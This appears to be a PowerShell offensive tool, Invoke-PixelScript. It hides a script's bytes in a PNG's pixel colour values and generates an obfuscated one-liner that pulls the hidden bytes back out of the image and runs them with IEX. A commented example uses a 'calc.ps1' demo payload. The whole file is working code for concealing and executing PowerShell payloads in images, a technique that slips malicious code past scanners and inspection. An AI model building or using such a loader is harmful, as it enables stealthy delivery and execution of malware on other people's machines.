function Invoke-PixelScript {
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [String] $Script,

        [Parameter(Position = 1, Mandatory = $true)]
        [String] $Out,

        [Parameter(Position = 2, Mandatory = $false)]
        [String] $Image,

        [Parameter(Position = 3, Mandatory = $false)]
        [String] $ExecPath = $Out
    )

    # Stop if we hit an error instead of making more errors
    $ErrorActionPreference = "Stop"

    # Load necessary .NET assemblies
    Add-Type -AssemblyName System.Drawing

    # Ensure paths are absolute
    $Script = Resolve-Path $Script
    if ($Image) {
        $Image = Resolve-Path $Image
    }

    # Read in the script
    $ScriptContent = [IO.File]::ReadAllText($Script)
    $payload = [System.Text.Encoding]::ASCII.GetBytes($ScriptContent)

    if ($Image) {
        $img = New-Object System.Drawing.Bitmap $Image
    } else {
        # Calculate necessary image size (simple square calculation for easy understanding)
        $sideLength = [Math]::Ceiling([Math]::Sqrt($payload.Length / 3)) * 3
        $img = New-Object System.Drawing.Bitmap $sideLength, $sideLength
    }

    $width = $img.Width
    $height = $img.Height

    # Process each pixel to embed the script payload
    for ($y = 0; $y -lt $height; $y++) {
        for ($x = 0; $x -lt $width; $x++) {
            $index = $y * $width + $x
            if ($index -lt $payload.Length) {
                $byteValue = $payload[$index]
                $color = $img.GetPixel($x, $y)
                $newR = ($color.R -band 0xF0) -bor ($byteValue -shr 4)
                $newG = ($color.G -band 0xF0) -bor ($byteValue -band 0x0F)
                $newColor = [System.Drawing.Color]::FromArgb($newR, $newG, $color.B)
                $img.SetPixel($x, $y, $newColor)
            }
        }
    }

    # Save the image as PNG
    $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
    $img.Dispose()

	# Generate the execution one-liner
	$pscmd = @"
	sal a New-Object;Add-Type -A System.Drawing;
	`$g=a System.Drawing.Bitmap(`"$ExecPath`");
	`$o=a Byte[] $($width*$height);
	(0..$($height-1))|%{
		foreach(`$x in 0..$($width-1)) {
			`$p=`$g.GetPixel(`$x, `$_);
			`$o[`$_*$width+`$x]=[math]::Floor((`$p.R -band 0x0F)*16) + (`$p.G -band 0x0F);
		}
	};
	`$g.Dispose();
	IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$($payload.Length-1)]))
	"@
	return $pscmd
}

# Example Usage
# $payload = Invoke-PixelScript -Script "C:\Users\User\Desktop\calc.ps1" -Image "C:\Users\User\Desktop\notSecret.png" -Out "$env:userprofile\downloads\out.png" -ExecPath "$env:userprofile\downloads\out.png"
